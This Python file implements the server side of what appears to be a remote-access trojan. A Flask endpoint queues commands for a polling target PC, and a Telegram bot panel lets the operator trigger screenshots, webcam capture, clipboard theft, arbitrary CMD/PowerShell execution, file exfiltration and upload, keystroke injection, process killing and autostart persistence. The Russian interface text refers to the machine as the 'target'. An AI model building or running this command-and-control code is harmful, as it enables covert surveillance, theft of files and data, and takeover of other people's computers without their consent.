import datetime as dt
import hashlib
import logging
import os
import signal
import time
import urllib.request
from collections import deque
from itertools import count
from pathlib import Path
from tempfile import gettempdir
from threading import Lock, Thread

import telebot
from flask import Flask, abort, after_this_request, jsonify, request, send_file
from werkzeug.utils import secure_filename


logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("telegram-bot")


class SettingsError(RuntimeError):
    pass


def require_env(name: str) -> str:
    value = os.getenv(name, "").strip()
    if not value:
        raise SettingsError(f"Environment variable {name} is required")
    return value


def parse_int_env(name: str) -> int:
    value = require_env(name)
    try:
        return int(value)
    except ValueError as exc:
        raise SettingsError(f"Environment variable {name} must be an integer") from exc


def normalize_public_url() -> str:
    explicit_url = os.getenv("PUBLIC_URL") or os.getenv("RAILWAY_PUBLIC_URL")
    railway_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN")

    if explicit_url:
        public_url = explicit_url.strip()
    elif railway_domain:
        public_url = f"https://{railway_domain.strip()}"
    else:
        return ""

    if not public_url.startswith(("http://", "https://")):
        public_url = f"https://{public_url}"
    return public_url.rstrip("/")


def normalize_path(value: str) -> str:
    path = (value or "/telegram").strip()
    if not path.startswith("/"):
        path = f"/{path}"
    return path.rstrip("/") or "/telegram"


class Settings:
    bot_token = require_env("BOT_TOKEN")
    admin_id = parse_int_env("ADMIN_ID")
    api_key = require_env("API_KEY")
    public_url = normalize_public_url()
    webhook_path = normalize_path(os.getenv("WEBHOOK_PATH", "/telegram"))
    webhook_secret = os.getenv("WEBHOOK_SECRET") or hashlib.sha256(api_key.encode()).hexdigest()
    port = int(os.getenv("PORT", "5000"))
    upload_dir = Path(os.getenv("UPLOAD_DIR", Path(gettempdir()) / "ai-bot-uploads"))
    online_ttl_seconds = int(os.getenv("ONLINE_TTL_SECONDS", "35"))
    max_upload_mb = int(os.getenv("MAX_UPLOAD_MB", "50"))
    keepalive_interval = int(os.getenv("KEEPALIVE_SECONDS", "240"))


settings = Settings()
settings.upload_dir.mkdir(parents=True, exist_ok=True)

bot = telebot.TeleBot(settings.bot_token, threaded=False)
app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = settings.max_upload_mb * 1024 * 1024

pending_commands: deque[dict[str, object]] = deque()
command_ids = count(1)
queue_lock = Lock()
state_by_chat: dict[int, str] = {}
page_by_chat: dict[int, int] = {}
pc_state = {"last_seen": None}


PAGES = [
    [
        ["📸 Скрин", "ℹ️ Инфо"],
        ["📋 Процессы", "📂 Файлы"],
        ["📋 Буфер", "💬 MSG"],
        ["⚡ CMD", "🔒 Блок"],
        ["➡️"],
    ],
    [
        ["🖱 Клик", "🖱 Мышь"],
        ["⌨️ Клавиша", "🔊 Громкость+"],
        ["🔉 Громкость-", "🔇 Мут"],
        ["🎥 Камера", "🚀 Запуск"],
        ["⬅️", "➡️"],
    ],
    [
        ["📦 Переместить", "🔍 Поиск"],
        ["📥 Скачать", "📤 Push"],
        ["💀 Выкл", "🔄 Рестарт"],
        ["🏠 Авто", "📊 Статус"],
        ["⬅️", "➡️"],
    ],
    [
        ["🚪 Alt+F4", "🔄 Alt+Tab"],
        ["📋 Ctrl+C", "📋 Ctrl+V"],
        ["全 Ctrl+A", "🧹 Стереть буфер"],
        ["⬅️"],
    ],
]

PROMPT_ACTIONS = {
    "💬 MSG": ("msg", "Слушаю и повинуюсь, сэр! Введите текст сообщения для вывода на экран:"),
    "⚡ CMD": ("cmd", "Введите CMD-команду, шеф:"),
    "🖱 Клик": ("click", "Координаты клика (x,y), сэр:"),
    "🖱 Мышь": ("mouse", "Формат x,y, шеф:"),
    "⌨️ Клавиша": ("key", "Какую кнопку нажать? (например enter, space, a):"),
    "🚀 Запуск": ("run", "Что запускаем, хозяин? (путь или команда):"),
    "📦 Переместить": ("move", "Что куда тащим? Формат: откуда > куда, шеф:"),
    "🔍 Поиск": ("search", "(имя папки или файла):"),
    "📥 Скачать": ("dl", "Какой файлик стянуть для вас, сэр? Укажите полный путь:"),
    "📤 Push": ("push", "Какой текст загрузить в буфер обмена на том конце, шеф?"),
}

BUTTON_COMMANDS = {
    "📸 Скрин": ("screen", "делаю фотку шеф! 📸😎"),
    "ℹ️ Инфо": ("info", "Секунду сэр"),
    "📋 Процессы": ("procs", "Секунду сэр! 🕵️‍♂️📋"),
    "📂 Файлы": ("ls:", "Открываю картотеку шеф! 📂👀"),
    "📋 Буфер": ("clip", "Будет исполнено! 📋🤫"),
    "🔒 Блок": ("lock", "Компьютер отправлен в глубокий сон сэр! 🔒💤"),
    "🔊 Громкость+": ("volume:up", "Делаю погромче шеф! 🔊💥"),
    "🔉 Громкость-": ("volume:down", "Делаю потише, сэр 🔉💤"),
    "🔇 Мут": ("volume:mute", "Звук на выключен сэр! 🔇🤫"),
    "🎥 Камера": ("webcam", "Улыбочку! 🎥"),
    "💀 Выкл": ("shutdown", "До связи! Тушу свет, шеф 💀💤"),
    "🔄 Рестарт": ("restart", "Перезагружаю... 🔄"),
    "🏠 Авто": ("startup", "Прописываюсь в автозапуск сэр"),
    "🚪 Alt+F4": ("altf4", "Закрываю активное окно, шеф! 🚪❌"),
    "🔄 Alt+Tab": ("alttab", "Переключаю окно, сэр! 🔄"),
    "📋 Ctrl+C": ("ctrlc", "Скопировал выделенное на ПК, хозяин! 📋"),
    "📋 Ctrl+V": ("ctrlv", "Вставил из буфера на ПК, шеф! 📋"),
    "全 Ctrl+A": ("ctrla", "Выделил всё на экране ПК, хозяин! 全"),
    "🧹 Стереть буфер": ("clearclip", "Буфер обмена цели очищен, сэр! 🧹"),
}

STATE_TO_COMMAND = {
    "cmd": "cmd",
    "ps": "ps",
    "msg": "msg",
    "click": "click",
    "mouse": "mouse",
    "key": "key",
    "run": "run",
    "move": "move",
    "search": "search",
    "dl": "dl",
    "push": "push",
    "kill": "kill",
}


def utc_now() -> dt.datetime:
    return dt.datetime.now(dt.timezone.utc)


def is_admin(message) -> bool:
    return bool(message and message.chat and message.chat.id == settings.admin_id)


def inline_keyboard(page: int = 0) -> telebot.types.InlineKeyboardMarkup:
    markup = telebot.types.InlineKeyboardMarkup()
    for row in PAGES[page]:
        buttons = []
        for btn in row:
            if btn == "➡️":
                buttons.append(telebot.types.InlineKeyboardButton(text="➡️ Следующая", callback_data=f"page:{page+1}"))
            elif btn == "⬅️":
                buttons.append(telebot.types.InlineKeyboardButton(text="Предыдущая ⬅️", callback_data=f"page:{page-1}"))
            elif btn in PROMPT_ACTIONS:
                buttons.append(telebot.types.InlineKeyboardButton(text=btn, callback_data=f"prompt:{btn}"))
            elif btn in BUTTON_COMMANDS:
                buttons.append(telebot.types.InlineKeyboardButton(text=btn, callback_data=f"cmd:{btn}"))
            else:
                buttons.append(telebot.types.InlineKeyboardButton(text=btn, callback_data="noop"))
        markup.row(*buttons)
    return markup


def enqueue(command: str) -> int:
    with queue_lock:
        command_id = next(command_ids)
        pending_commands.append({"id": command_id, "cmd": command})
    logger.info("Queued command %s: %s", command_id, command[:60])
    return command_id


def drain_commands() -> list[dict[str, object]]:
    with queue_lock:
        commands = list(pending_commands)
        pending_commands.clear()
    return commands


def pc_online() -> bool:
    last_seen = pc_state.get("last_seen")
    if not isinstance(last_seen, dt.datetime):
        return False
    return (utc_now() - last_seen).total_seconds() <= settings.online_ttl_seconds


def last_seen_text() -> str:
    last_seen = pc_state.get("last_seen")
    if not isinstance(last_seen, dt.datetime):
        return "нет данных"
    return last_seen.astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")


def send_chunks(chat_id: int, text: str) -> None:
    if not text:
        return
    chunk_size = 3900
    for start in range(0, len(text), chunk_size):
        for attempt in range(3):
            try:
                bot.send_message(chat_id, text[start : start + chunk_size])
                break
            except Exception:
                if attempt == 2:
                    logger.exception("Failed to send chunk to Telegram after 3 attempts")
                else:
                    time.sleep(1)


def require_api_key() -> None:
    payload = request.get_json(silent=True) if request.is_json else None
    provided = request.args.get("key") or request.form.get("key")
    if payload:
        provided = provided or payload.get("key")
    if provided != settings.api_key:
        abort(403)


def request_text() -> str:
    payload = request.get_json(silent=True) if request.is_json else None
    if payload:
        return str(payload.get("text", ""))
    return request.form.get("text", "")


def save_upload(file_storage, filename: str) -> Path:
    safe_name = secure_filename(filename) or "file"
    path = settings.upload_dir / safe_name
    file_storage.save(path)
    return path


# ---------------------------------------------------------------------------
#  Keepalive: prevent Railway from sleeping the service
# ---------------------------------------------------------------------------

def keepalive_loop() -> None:
    """Periodically ping our own /health endpoint to keep Railway awake."""
    while True:
        time.sleep(settings.keepalive_interval)
        if not settings.public_url:
            continue
        try:
            url = f"{settings.public_url}/health"
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, timeout=15):
                pass
            logger.debug("Keepalive ping OK")
        except Exception:
            logger.debug("Keepalive ping failed (non-critical)")


# ---------------------------------------------------------------------------
#  Flask routes
# ---------------------------------------------------------------------------

@app.get("/")
def index():
    return jsonify({"ok": True, "service": "telegram-bot", "pc_online": pc_online()})


@app.get("/health")
def health():
    return jsonify({"ok": True, "uptime": time.monotonic()})


@app.post(settings.webhook_path)
def telegram_webhook():
    if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != settings.webhook_secret:
        abort(403)
    if not request.is_json:
        abort(415)

    try:
        update = telebot.types.Update.de_json(request.get_data().decode("utf-8"))
        bot.process_new_updates([update])
    except Exception:
        logger.exception("Error processing Telegram update")
    return "", 200


@app.get("/api/poll")
def poll():
    require_api_key()
    pc_state["last_seen"] = utc_now()
    return jsonify({"commands": drain_commands()})


@app.post("/api/result")
def result():
    require_api_key()
    try:
        send_chunks(settings.admin_id, request_text())
    except Exception:
        logger.exception("Failed to forward result to Telegram")
    return jsonify({"ok": True})


@app.post("/api/photo")
def photo():
    require_api_key()
    file_storage = request.files.get("photo")
    if not file_storage:
        return jsonify({"ok": False, "error": "photo is required"}), 400

    path = save_upload(file_storage, "screen.jpg")
    try:
        with path.open("rb") as file_obj:
            for attempt in range(3):
                try:
                    bot.send_photo(settings.admin_id, file_obj)
                    break
                except Exception:
                    if attempt == 2:
                        logger.exception("Failed to forward photo after 3 attempts")
                    else:
                        file_obj.seek(0)
                        time.sleep(1)
    finally:
        path.unlink(missing_ok=True)
    return jsonify({"ok": True})


@app.post("/api/file")
def file():
    require_api_key()
    file_storage = request.files.get("file")
    filename = request.form.get("filename") or getattr(file_storage, "filename", "file")
    if not file_storage:
        return jsonify({"ok": False, "error": "file is required"}), 400

    path = save_upload(file_storage, filename)
    try:
        with path.open("rb") as file_obj:
            for attempt in range(3):
                try:
                    bot.send_document(settings.admin_id, file_obj, visible_file_name=filename)
                    break
                except Exception:
                    if attempt == 2:
                        logger.exception("Failed to forward file after 3 attempts")
                    else:
                        file_obj.seek(0)
                        time.sleep(1)
    finally:
        path.unlink(missing_ok=True)
    return jsonify({"ok": True})


@app.get("/api/download")
def download_for_pc():
    require_api_key()
    upload = next(settings.upload_dir.glob("for_pc_*"), None)
    if not upload:
        return jsonify({"file": None})

    download_name = upload.name.removeprefix("for_pc_")

    @after_this_request
    def cleanup(response):
        try:
            upload.unlink(missing_ok=True)
        except Exception:
            logger.exception("Failed to remove downloaded file")
        return response

    return send_file(upload, download_name=download_name, as_attachment=True)


# ---------------------------------------------------------------------------
#  Telegram handlers
# ---------------------------------------------------------------------------

@bot.message_handler(commands=["start", "help", "menu"])
def start(message):
    if not is_admin(message):
        return

    page_by_chat[message.chat.id] = 0
    status = "🟢 онлайн" if pc_online() else "🔴 офлайн"
    text = (
        f"👋 Приветствую, мой повелитель!\n\n"
        f"Статус цели: {status}\n"
        f"Последний пинг: {last_seen_text()}\n\n"
        f"Выберите команду на панели управления, сэр: 👇"
    )
    bot.send_message(message.chat.id, text, reply_markup=inline_keyboard(0))


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    if chat_id != settings.admin_id:
        return

    data = call.data

    if data.startswith("page:"):
        target_page = int(data.split(":")[1])
        page_by_chat[chat_id] = target_page
        status = "🟢 онлайн" if pc_online() else "🔴 офлайн"
        text = (
            f"👋 Приветствую, мой повелитель!\n\n"
            f"Статус цели: {status}\n"
            f"Последний пинг: {last_seen_text()}\n\n"
            f"Выберите команду на панели управления, сэр: 👇"
        )
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=inline_keyboard(target_page)
            )
        except Exception:
            pass
        bot.answer_callback_query(call.id)

    elif data.startswith("cmd:"):
        btn_text = data.split(":", 1)[1]
        command, reply = BUTTON_COMMANDS[btn_text]
        enqueue(command)
        bot.answer_callback_query(call.id, text=reply, show_alert=True)

    elif data.startswith("prompt:"):
        btn_text = data.split(":", 1)[1]
        state, prompt = PROMPT_ACTIONS[btn_text]
        state_by_chat[chat_id] = state
        bot.send_message(chat_id, prompt)
        bot.answer_callback_query(call.id)

    elif data == "noop":
        bot.answer_callback_query(call.id)


@bot.message_handler(commands=["cmd"])
def handle_cmd(message):
    if not is_admin(message):
        return

    command = message.text.partition(" ")[2].strip()
    if command:
        enqueue(f"cmd:{command}")
        bot.send_message(message.chat.id, f"🫡 Слушаюсь! Команда отправлена: {command}")
    else:
        state_by_chat[message.chat.id] = "cmd"
        bot.send_message(message.chat.id, "Введи CMD-команду, шеф:")


@bot.message_handler(commands=["ps"])
def handle_ps(message):
    if not is_admin(message):
        return

    command = message.text.partition(" ")[2].strip()
    if command:
        enqueue(f"ps:{command}")
        bot.send_message(message.chat.id, f"🫡 Понял! PowerShell запущен: {command}")
    else:
        state_by_chat[message.chat.id] = "ps"
        bot.send_message(message.chat.id, "Введи PowerShell-команду, сэр:")


@bot.message_handler(commands=["screen"])
def handle_screen(message):
    if is_admin(message):
        enqueue("screen")
        bot.send_message(message.chat.id, "Опа, делаю фотку, шеф! Сейчас прилетит 📸😎")


@bot.message_handler(commands=["info"])
def handle_info(message):
    if is_admin(message):
        enqueue("info")
        bot.send_message(message.chat.id, "Секунду, сэр, сейчас выгружу всю подноготную этого ведра с гайками 🖥️🔍")


@bot.message_handler(commands=["ls"])
def handle_ls(message):
    if not is_admin(message):
        return

    path = message.text.partition(" ")[2].strip()
    enqueue(f"ls:{path}")
    bot.send_message(message.chat.id, "Открываю картотеку, шеф! Загружаю файлы 📂👀")


@bot.message_handler(commands=["dl"])
def handle_dl(message):
    if not is_admin(message):
        return

    path = message.text.partition(" ")[2].strip()
    if path:
        enqueue(f"dl:{path}")
        bot.send_message(message.chat.id, "Уже тащу этот файл, сэр! 📥")
    else:
        state_by_chat[message.chat.id] = "dl"
        bot.send_message(message.chat.id, "Какой файлик стянуть для вас, сэр? Укажите полный путь:")


@bot.message_handler(commands=["kill"])
def handle_kill(message):
    if not is_admin(message):
        return

    process = message.text.partition(" ")[2].strip()
    if process:
        enqueue(f"kill:{process}")
        bot.send_message(message.chat.id, f"🔫 Устраняю процесс {process}, сэр!")
    else:
        state_by_chat[message.chat.id] = "kill"
        bot.send_message(message.chat.id, "Имя процесса или PID на ликвидацию, шеф:")


@bot.message_handler(content_types=["document"], func=is_admin)
def handle_document(message):
    filename = message.document.file_name or "file"
    safe_name = secure_filename(filename) or "file"
    target = settings.upload_dir / f"for_pc_{safe_name}"

    try:
        file_info = bot.get_file(message.document.file_id)
        data = bot.download_file(file_info.file_path)
        target.write_bytes(data)
        enqueue(f"upload:{safe_name}")
        bot.send_message(message.chat.id, "📥 Принял файлик! Поставил в очередь на загрузку, сэр!")
    except Exception as exc:
        logger.exception("Failed to queue Telegram document")
        bot.send_message(message.chat.id, f"Упс, фатальная ошибочка при загрузке: {exc}")


@bot.message_handler(content_types=["text"], func=is_admin)
def handle_text(message):
    text = message.text.strip()
    chat_id = message.chat.id

    state = state_by_chat.pop(chat_id, None)
    if state:
        command = STATE_TO_COMMAND.get(state)
        if command:
            enqueue(f"{command}:{text}")
            bot.send_message(chat_id, f"🫡 Так точно! Отправил команду {command} с вашими параметрами.")
        return

    if text == "📊 Статус":
        status = "🟢 Онлайн" if pc_online() else "🔴 Офлайн"
        bot.send_message(chat_id, f"{status}\nПоследний пинг: {last_seen_text()}")
        return

    bot.send_message(chat_id, "Хм, сэр, я вас не совсем понял. Воспользуйтесь нашей божественной интерактивной панелью: /menu")


# ---------------------------------------------------------------------------
#  Webhook configuration with retry
# ---------------------------------------------------------------------------

def configure_webhook(max_retries: int = 5) -> None:
    if not settings.public_url:
        logger.info("PUBLIC_URL/RAILWAY_PUBLIC_DOMAIN is not set; webhook is disabled")
        return

    webhook_url = f"{settings.public_url}{settings.webhook_path}"
    for attempt in range(1, max_retries + 1):
        try:
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=webhook_url, secret_token=settings.webhook_secret)
            logger.info("Telegram webhook configured: %s (attempt %d)", webhook_url, attempt)
            return
        except Exception:
            logger.exception("Webhook setup attempt %d/%d failed", attempt, max_retries)
            if attempt < max_retries:
                time.sleep(min(2 ** attempt, 30))

    logger.error("Failed to configure webhook after %d attempts", max_retries)


def run_polling() -> None:
    bot.remove_webhook()
    while True:
        try:
            bot.polling(non_stop=True, interval=1, timeout=60)
        except Exception:
            logger.exception("Telegram polling crashed; restarting")
            time.sleep(5)


# ---------------------------------------------------------------------------
#  Startup
# ---------------------------------------------------------------------------

configure_webhook()

# Start keepalive thread to prevent Railway from sleeping
if settings.public_url:
    _keepalive_thread = Thread(target=keepalive_loop, daemon=True, name="keepalive")
    _keepalive_thread.start()
    logger.info("Keepalive thread started (interval=%ds)", settings.keepalive_interval)


if __name__ == "__main__":
    if settings.public_url:
        app.run(host="0.0.0.0", port=settings.port)
    else:
        Thread(target=lambda: app.run(host="0.0.0.0", port=settings.port), daemon=True).start()
        run_polling()
